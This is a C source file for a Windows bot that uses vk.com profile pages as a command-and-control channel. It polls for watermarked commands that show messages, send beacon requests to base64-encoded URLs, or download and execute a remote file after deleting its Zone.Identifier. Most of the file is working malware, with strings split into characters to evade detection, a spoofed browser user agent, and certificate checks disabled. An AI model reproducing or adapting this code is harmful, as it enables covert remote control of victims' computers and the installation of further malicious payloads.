#include "global.h"

static const unsigned char pr2six[256] =
{
	/* ASCII table */
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 62, 64, 64, 64, 63,
	52, 53, 54, 55, 56, 57, 58, 59, 60, 61, 64, 64, 64, 64, 64, 64,
	64, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14,
	15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 64, 64, 64, 64, 64,
	64, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40,
	41, 42, 43, 44, 45, 46, 47, 48, 49, 50, 51, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64,
	64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64, 64
};

int Base64decode_len(const char *bufcoded)
{
	int nbytesdecoded;
	register const unsigned char *bufin;
	register int nprbytes;

	bufin = (const unsigned char *)bufcoded;
	while (pr2six[*(bufin++)] <= 63);

	nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;
	nbytesdecoded = ((nprbytes + 3) / 4) * 3;

	return nbytesdecoded + 1;
}

int Base64decode(char *bufplain, const char *bufcoded)
{
	int nbytesdecoded;
	register const unsigned char *bufin;
	register unsigned char *bufout;
	register int nprbytes;

	bufin = (const unsigned char *)bufcoded;
	while (pr2six[*(bufin++)] <= 63);
	nprbytes = (bufin - (const unsigned char *)bufcoded) - 1;
	nbytesdecoded = ((nprbytes + 3) / 4) * 3;

	bufout = (unsigned char *)bufplain;
	bufin = (const unsigned char *)bufcoded;

	while (nprbytes > 4) {
		*(bufout++) =
			(unsigned char)(pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
		*(bufout++) =
			(unsigned char)(pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
		*(bufout++) =
			(unsigned char)(pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
		bufin += 4;
		nprbytes -= 4;
	}

	
	if (nprbytes > 1) {
		*(bufout++) =
			(unsigned char)(pr2six[*bufin] << 2 | pr2six[bufin[1]] >> 4);
	}
	if (nprbytes > 2) {
		*(bufout++) =
			(unsigned char)(pr2six[bufin[1]] << 4 | pr2six[bufin[2]] >> 2);
	}
	if (nprbytes > 3) {
		*(bufout++) =
			(unsigned char)(pr2six[bufin[2]] << 6 | pr2six[bufin[3]]);
	}

	*(bufout++) = '\0';
	nbytesdecoded -= (4 - nprbytes) & 3;
	return nbytesdecoded;
}

HINTERNET OpenInternet(LPWSTR UserAgent)
{
	HINTERNET hRet = InternetOpenW(UserAgent, INTERNET_OPEN_TYPE_DIRECT, NULL, NULL, 0);

	if (!hRet)
	{
		hRet = InternetOpenW(UserAgent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, INTERNET_FLAG_ASYNC);
	}
	return hRet;
}


wchar_t * __cdecl mystrstr(
	wchar_t * str1,
	wchar_t * str2
	)
{
	wchar_t*cp = (wchar_t*)str1;
	wchar_t*s1, *s2;

	if (!*str2)
		return((wchar_t*)str1);

	while (*cp)
	{
		s1 = cp;
		s2 = (wchar_t*)str2;

		while (*s1 && *s2 && !(*s1 - *s2))
			s1++, s2++;

		if (!*s2)
			return(cp);

		cp++;
	}

	return(NULL);
}

char * __cdecl mystrstr(
	char * str1,
	char * str2
	)
{
	char*cp = (char*)str1;
	char*s1, *s2;

	if (!*str2)
		return((char*)str1);

	while (*cp)
	{
		s1 = cp;
		s2 = (char*)str2;

		while (*s1 && *s2 && !(*s1 - *s2))
			s1++, s2++;

		if (!*s2)
			return(cp);

		cp++;
	}

	return(NULL);

}

BOOL ParseHtml(PCHAR szHtml, DWORD dwSize, PCHAR *pOut)
{

	PCHAR pCommand = mystrstr(szHtml, WATERMARK);
	if (pCommand)
	{
		pCommand += lstrlenA(WATERMARK);
		*pOut = pCommand;
		return TRUE;
	}
	return FALSE;
}

BOOL GetCommand(PCHAR pCommandOutput, LPWSTR pUserId)
{
	dbg(L"Trying to get command from: ", pUserId);
	BOOL bRet = FALSE;
	HINTERNET hInternet;
	
	WCHAR szUserAgent[] =
	{
		L'M', L'o', L'z', L'i', L'l', L'l', L'a',
		L'/', L'5', L'.', L'0', L' ', L'(', L'W', L'i',
		L'n', L'd', L'o', L'w', L's', L' ', L'N',
		L'T', L' ', L'6', L'.', L'1', L';', L' ',
		L'W', L'O', L'W', L'6', L'4', L')', L' ',
		L'A', L'p', L'p', L'l', L'e', L'W', L'e',
		L'b', L'K', L'i', L't', L'/', L'5', L'3',
		L'7', L'.', L'3', L'6', L' ', L'(', L'K',
		L'H', L'T', L'M', L'L', L',', L' ', L'l', L'i',
		L'k', L'e', L' ', L'G', L'e', L'c', L'k',
		L'o', L')', L' ', L'C', L'h', L'r', L'o',
		L'm', L'e', L'/', L'5', L'5', L'.', L'0',
		L'.', L'2', L'8', L'8', L'3', L'.', L'8',
		L'7', L' ', L'S', L'a', L'f', L'a', L'r',
		L'i', L'/', L'5', L'3', L'7', L'.', L'3',
		L'6', L'\0'
	};




	dbg(L"Using UserAgent: ", szUserAgent);
	do
	{
		hInternet = OpenInternet(szUserAgent);
	} while (!hInternet);

	HINTERNET hConnect;
	do
	{
		dbg(L"Connecting to vk.com");
		hConnect = InternetConnectW(hInternet, L"vk.com", INTERNET_DEFAULT_HTTPS_PORT, L"", L"", INTERNET_SERVICE_HTTP, 0, 0);
	} while ((!hConnect) || (Sleep(10000), FALSE));

	WCHAR GetSz[] =
	{
		L'G', L'E', L'T', L'\0'
	};

	WCHAR HttpVersz[] =
	{
		L'H', L'T', L'T', L'P', L'/', L'1', L'.', L'1', '\0'
	};

	dbg(L"Connected to vk.com");

	HINTERNET hRequest = HttpOpenRequestW(hConnect, GetSz, pUserId, HttpVersz, 0, 0,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
		INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
		INTERNET_FLAG_NO_AUTH |
		INTERNET_FLAG_NO_CACHE_WRITE |
		INTERNET_FLAG_NO_UI |
		INTERNET_FLAG_SECURE |
		INTERNET_FLAG_PRAGMA_NOCACHE |
		INTERNET_FLAG_RELOAD, NULL);

	if (hRequest)
	{
		dbg(L"Request opened");
		if (HttpSendRequestW(hRequest, 0, 0, 0, 0))
		{
			dbg("Request sent");
			PCHAR pResponse = (PCHAR)VirtualAlloc(0, 10240, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

			if (pResponse)
			{
				DWORD dwRead;
				dbg("Reading html: ");
				while (InternetReadFile(hRequest, pResponse, 10240 - 1, &dwRead) && dwRead)
				{
					pResponse[dwRead] = 0;
					PCHAR pFoundCommand;
					if (ParseHtml(pResponse, dwRead, &pFoundCommand))
					{
						dbg("Found watermark");
						PCHAR pFoundCommandEnd = mystrstr(pFoundCommand, ENDWATERMARK);
						if (!pFoundCommandEnd)
							break;
						pFoundCommandEnd[0] = '\0';

						lstrcpyA(pCommandOutput, pFoundCommand);

						bRet = TRUE;
					}
					else
					{
						dbg("Watermark not found in this block");
					}
					if (bRet)
					{
						break;
					}
					dwRead = 0;
				}
				VirtualFree(pResponse, 0, MEM_RELEASE);
			}
		}
		InternetCloseHandle(hRequest);
	}

	InternetCloseHandle(hInternet);
	return bRet;
}



BOOL IsCorrect(PWCHAR RequestUrl)
{
	BOOL bDot = FALSE;
	BOOL bSlash = FALSE;

	WCHAR HttpSz[] = 
	{
		L'h', L't', L't', L'p', L':', L'/', L'/', '\0'
	};
	PWCHAR lpHttpStart = mystrstr(RequestUrl, L"http://");

	if (!lpHttpStart)
		return FALSE;


	if (RequestUrl != lpHttpStart) 
		return FALSE;

	RequestUrl += 7; 
	
	for (INT i = 0; i < lstrlenW(RequestUrl); i++)
	{
		if (RequestUrl[i] == L'.')
			bDot = TRUE;
		else if (RequestUrl[i] == L'/')
			bSlash = TRUE;
	}
	return ((bDot) && (bSlash)); 
}

class RAII_VirtualAlloc
{
public:
	RAII_VirtualAlloc(DWORD dwSize)
	{
		pAddr = VirtualAlloc(0, dwSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	}
	~RAII_VirtualAlloc()
	{
		VirtualFree(pAddr, 0, MEM_RELEASE);
	}
	LPVOID GetAddr()
	{
		return pAddr;
	}
private:
	LPVOID pAddr;
};

BOOL GetDomainPart(PWCHAR pOut, PWCHAR RequestUrl, DWORD dwLen)
{
	RequestUrl += 7; // îáðåçàåì http://
	lstrcpyW(pOut, RequestUrl);

	for (INT i = 0; i < lstrlenW(RequestUrl); i++)
	{
		if (pOut[i] == L'/')
		{
			pOut[i] = '\0';
			break;
		}
	}

	return TRUE;
}

BOOL GetScriptPart(PWCHAR pOut, PWCHAR RequestUrl, DWORD dwLen)
{
	RequestUrl += 7; 

	for (INT i = 0; i < lstrlenW(RequestUrl); i++)
	{
		if (RequestUrl[i] == L'/')
		{
			RequestUrl += i;
			lstrcpyW(pOut, RequestUrl);
			break;
		}
	}

	return TRUE;
}

BOOL MakeRequest(PCHAR RequestUrl, PWCHAR SensitiveInformation)
{
	RAII_VirtualAlloc UnicodeUrl(512);
	PWCHAR pUnicodeUrl = (PWCHAR)UnicodeUrl.GetAddr();

	if (!pUnicodeUrl)
		return FALSE;

	wsprintfW(pUnicodeUrl, L"%S", RequestUrl);

	if (!IsCorrect(pUnicodeUrl))
		return FALSE;

	RAII_VirtualAlloc DomainPart(512);
	RAII_VirtualAlloc ScriptPart(512);

	PWCHAR pDomainPart = (PWCHAR)DomainPart.GetAddr();
	PWCHAR pScriptPart = (PWCHAR)ScriptPart.GetAddr();

	if (!GetDomainPart(pDomainPart, pUnicodeUrl, 512))
		return FALSE;
	if (!GetScriptPart(pScriptPart, pUnicodeUrl, 512))
		return FALSE;

	HINTERNET hInternet;
	do
	{
		hInternet = OpenInternet(SensitiveInformation); 
	} while (!hInternet);

	BOOL bRet = FALSE;

	DWORD dwTries = 0;

	HINTERNET hConnect;
	do
	{
		hConnect = InternetConnectW(hInternet, pDomainPart, INTERNET_DEFAULT_HTTPS_PORT, L"", L"", INTERNET_SERVICE_HTTP, 0, 0);
		dwTries++;
		if ((dwTries == 5) && (!hConnect))
		{
			InternetCloseHandle(hInternet);
			return FALSE;
		}
	} while ((!hConnect) || (Sleep(10000), FALSE));
		

	WCHAR GetSz[] = 
	{
		L'G', L'E', L'T', L'\0'
	};

	WCHAR HttpVersz[] = 
	{
		L'H', L'T', L'T', L'P', L'/', L'1', L'.', L'1', '\0'
	};

	HINTERNET hRequest = HttpOpenRequestW(hConnect, GetSz, pScriptPart, HttpVersz, 0, 0,
		INTERNET_FLAG_HYPERLINK | INTERNET_FLAG_IGNORE_CERT_CN_INVALID |
		INTERNET_FLAG_IGNORE_CERT_DATE_INVALID |
		INTERNET_FLAG_NO_AUTH |
		INTERNET_FLAG_NO_CACHE_WRITE |
		INTERNET_FLAG_NO_UI |
		INTERNET_FLAG_SECURE |
		INTERNET_FLAG_PRAGMA_NOCACHE |
		INTERNET_FLAG_RELOAD, NULL);

	if (hRequest)
	{

		if (HttpSendRequestW(hRequest, 0, 0, 0, 0))
			bRet = TRUE;

		InternetCloseHandle(hRequest);
	}

	InternetCloseHandle(hInternet);
	return bRet;
}

BOOL DownloadNexecute(PCHAR pUrl)
{
	GlobalMemory MyMem(1024 + 2 + 512 + 100);
	PWCHAR pUnicodeUrl = (PWCHAR)MyMem.localloc(512);
	wsprintfW(pUnicodeUrl, L"%S", pUrl);
	PWCHAR pTarget = (PWCHAR)MyMem.localloc(512);

	WCHAR szRandomString[RandomDirectoryLen + 4 + 1] =
	{
		L'P', L'a', L'i', L'm', L'o', L'n', L'\0'
	};

	if (!GenerateRandomString(szRandomString, RandomDirectoryLen))
		dbg("Can not gen random string, using default");

	Downloader Dwnld;

	HRESULT hRes = SHGetFolderPathW(0, CSIDL_APPDATA | CSIDL_FLAG_CREATE, NULL, SHGFP_TYPE_CURRENT, pTarget);
	if (hRes != S_OK)
		GetTempPathW(256, pTarget);

	lstrcatW(pTarget, L"\\");

	lstrcatW(pTarget, szRandomString);
	HINSTANCE hInst = (HINSTANCE)0;
	if (Dwnld.save(pUnicodeUrl, pTarget))
	{
		PWCHAR pZoneIdentifier = (PWCHAR)MyMem.localloc(512 + 100);
		WCHAR ZoneIdent[] =
		{
			L'%', L's', L':', L'Z', L'o', L'n', L'e', L'.',
			L'I', L'd', L'e', L'n', L't',
			L'i', L'f', L'i', L'e', L'r', L'\0'
		};
		wsprintfW(pZoneIdentifier, ZoneIdent, pTarget);

		if (DeleteFileW(pZoneIdentifier))
			dbg("Zone identifier found and removed");

		WCHAR szOpen[] =
		{
			L'o', L'p', L'e', L'n', L'\0'
		};
		hInst = ShellExecuteW(0, szOpen, pTarget, 0, 0, SW_SHOW);
	}
	return ((INT)hInst > 32);
}

DWORD WINAPI ControlMain()
{

	PCHAR pCommand = (PCHAR)VirtualAlloc(0, 1024, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pCommand)
		ExitProcess(0);
	PCHAR pCommandOld = (PCHAR)VirtualAlloc(0, 1025, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (!pCommand)
	{
		VirtualFree(pCommand, 0, MEM_RELEASE);
		ExitProcess(0);
	}

	lstrcpyA(pCommandOld, "AAAAAA");

	PCHAR pData;

	BOOL bFound = FALSE;
	while (TRUE)
	{

		const INT PAGE_NUM = 3;
		PWCHAR szPages[PAGE_NUM] =
		{
			L"/id1",
			L"/id2",
			L"/id3"
		};

		for (INT i = 0; i < PAGE_NUM; i++)
		{
			bFound = GetCommand(pCommand, szPages[i]);
			if (bFound)
			{
				dbg(L"Found C&C page:", szPages[i]);
				dbg("Read command: ", pCommand);

				if (!lstrcmpA(pCommandOld, pCommand))
				{
					dbg("Already executed");
					break;
				}
				lstrcpyA(pCommandOld, pCommand);

				CHAR MsgCom[] =
				{
					'm', 's', 'g', 'c', '\0'
				};

				CHAR StatCom[] = 
				{
					's', 't', 'a', 't', 'c', '\0'
				};

				CHAR NoOperation[] = 
				{
					'n', 'o', 'p', 'c', '\0'
				};

				CHAR CommDownload[] =
				{
					'd', 'w', 'n', 'l', 'd', '\0'
				};

				if (mystrstr(pCommand, MsgCom))
				{
					dbg(L"Found command msgc");
					pData = mystrstr(pCommand, MsgCom) + 4;
					if (*pData != '\0')
					{
						MessageBoxA(0, pData, pData, MB_OK);
					}
				}
				else if (mystrstr(pCommand, StatCom)) //format http://subdomain.server.com/script.php or http://server.com/script.php
				{
					dbg(L"Found command stat");
					pData = mystrstr(pCommand, StatCom) + 5;
					if (*pData != '\0')
					{

						PCHAR pUrl = (PCHAR)VirtualAlloc(0, Base64decode_len(pData) + 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

						if (pUrl)
						{
							Base64decode(pUrl, pData);

							WCHAR BearIdentificator[] = 
							{
								L'B', L'e', L'a', L'r', L'l', L'd', L'r', L'\0'
							};
							MakeRequest(pUrl, BearIdentificator); 

							VirtualFree(pUrl, 0, MEM_RELEASE);
						}

					}
				}
				else if (mystrstr(pCommand, NoOperation))
				{
					dbg(L"No operation");
				} 
				else if (mystrstr(pCommand, CommDownload))
				{
					dbg(L"Download and execute command found");
					pData = mystrstr(pCommand, CommDownload) + 5;
					if (*pData != '\0')
					{
						PCHAR pUrl = (PCHAR)VirtualAlloc(0, Base64decode_len(pData) + 2, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

						if (pUrl)
						{
							Base64decode(pUrl, pData);

							if (DownloadNexecute(pUrl))
							{
								dbg("Downloaded and executed!");
							} 
							else
							{
								dbg("Error downloading and executing file");
							}
							
							VirtualFree(pUrl, 0, MEM_RELEASE);
						}
					}
				}

				break; 
			}
			else
			{
				dbg(L"Is not C&C: ", szPages[i]);
				
				
			}
		}
		dbg(L"Sleeping 30 secs");
		Sleep(30 * 1000);
	} 
	VirtualFree(pCommand, 0, MEM_RELEASE);
	VirtualFree(pCommandOld, 0, MEM_RELEASE);
	ExitProcess(0);
}
